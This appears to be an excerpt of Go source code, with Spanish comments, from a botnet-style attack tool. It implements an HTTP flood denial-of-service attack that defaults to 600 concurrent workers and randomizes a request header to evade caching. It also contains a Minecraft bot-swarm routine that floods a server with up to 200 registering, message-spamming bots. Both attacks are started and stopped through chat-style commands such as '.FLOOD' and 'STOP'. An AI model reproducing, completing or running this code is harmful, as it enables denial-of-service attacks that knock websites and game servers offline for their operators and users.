...
// ─── FLOOD GLOBALES ──────────────────────────────────────────────────────────
var (
	floodTotalRequests   int64
	floodSuccessRequests int64
	floodFailedRequests  int64
	floodStartTime       time.Time
	floodStopChan        chan struct{}
	floodRunning         bool
	floodMu              sync.Mutex
	floodWg              sync.WaitGroup
	floodClient          *http.Client
	floodTransport       *http.Transport
)
...
func createFloodTransport(config *FloodAttackConfig) *http.Transport {
	dialer := &net.Dialer{
...
func floodWorker(client *http.Client, config *FloodAttackConfig) {
	defer floodWg.Done()
	...
	for {
		...
		if config.RandomPayload {
			reqCopy.Header.Set("X-Nonce", strconv.FormatInt(time.Now().UnixNano(), 36))
		}

		resp, err := client.Do(reqCopy)
		atomic.AddInt64(&floodTotalRequests, 1)

		if err != nil {
			atomic.AddInt64(&floodFailedRequests, 1)
			continue
		}
		...
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			atomic.AddInt64(&floodSuccessRequests, 1)
		} else {
			atomic.AddInt64(&floodFailedRequests, 1)
		}
	}
...
func parseFloodTarget(target string) (string, bool) {
...
func startFloodAttack(target string, port int, duration int, threads int, username string) {
	floodMu.Lock()
	...
	atomic.StoreInt64(&floodTotalRequests, 0)
	atomic.StoreInt64(&floodSuccessRequests, 0)
	atomic.StoreInt64(&floodFailedRequests, 0)

	if threads <= 0 {
		threads = 600
	}

	targetURL, useTLS := parseFloodTarget(target)
	if port > 0 && !strings.Contains(targetURL, ":"+strconv.Itoa(port)) {
		if u, err := url.Parse(targetURL); err == nil && u != nil {
			u.Host = fmt.Sprintf("%s:%d", u.Hostname(), port)
			targetURL = u.String()
		}
	}

	floodStopChan = make(chan struct{})
	floodRunning = true
	floodStartTime = time.Now()

	config := &FloodAttackConfig{
		TargetURL:     targetURL,
		...
		RandomPayload: true,
		StopChan:      floodStopChan,
	}

	fmt.Printf("[FLOOD] Atacando %s:%d por %ds con %d threads\n", target, port, duration, threads)

	floodTransport = createFloodTransport(config)
	floodClient = &http.Client{
	...
	for i := 0; i < threads; i++ {
		floodWg.Add(1)
		go floodWorker(floodClient, config)
	}

	// Esperar y mostrar estadísticas finales
	go func() {
		floodWg.Wait()
		...
		if floodTransport != nil {
			floodTransport.CloseIdleConnections()
		}

		total := atomic.LoadInt64(&floodTotalRequests)
		success := atomic.LoadInt64(&floodSuccessRequests)
		failed := atomic.LoadInt64(&floodFailedRequests)
		elapsed := time.Since(floodStartTime).Seconds()
		if elapsed < 1 {
			elapsed = 1
		}

		fmt.Println("\n[FLOOD] ========== FINAL ==========")
		fmt.Printf("[FLOOD] Total: %d | OK: %d | Fail: %d | RPS: %d\n",
			total, success, failed, int64(float64(total)/elapsed))
		fmt.Println("[FLOOD] ============================")
	}()
}

func stopFloodAttack() {
	floodMu.Lock()
	defer floodMu.Unlock()
...
func startMCBotAttack(host string, port int, nombre string, cantidad int, tiempo int, registerCmd string, mensajesRaw string, intervalo int) {
	...
	registerCmdFinal := registerCmd

	if registerCmd != "" && registerCmd != "0" && registerCmd != "null" {
		if strings.HasPrefix(registerCmd, "/") {
			registerProvided = true
			registerCmdFinal = registerCmd
		} else if registerCmd != "" {
			registerProvided = true
			registerCmdFinal = registerCmd
	...
	fmt.Printf("[MCBot] Register: '%s', Provided: %v\n", registerCmdFinal, registerProvided)
	fmt.Printf("[MCBot] Mensajes: %v, Intervalo: %ds\n", messages, intervalo)

	if cantidad > 200 {
		cantidad = 200
		fmt.Printf("[MCBot] Limitado a 200 bots\n")
	}
	...
	for i := 0; i < cantidad; i++ {
		...
		go func(id int) {
			...
			bot, err := newMCBot(ctxBot, host, port, nombre, registerCmdFinal, registerProvided, messages, interval, stopChan)
			if err != nil {
		...
		for {
			...
			case "STOP", ".STOP":
				if len(args) > 1 {
					...
					if username == "FLOOD" || strings.Contains(username, "FLOOD") {
						stopFloodAttack()
					}
			...
			case ".FLOOD":
				if len(args) >= 4 {
					...
					fmt.Printf("[ATTACK] %s iniciado .FLOOD en %s:%d por %ds\n", username, target, port, tiempo)

					go startFloodAttack(target, port, tiempo, threads, username)
				}
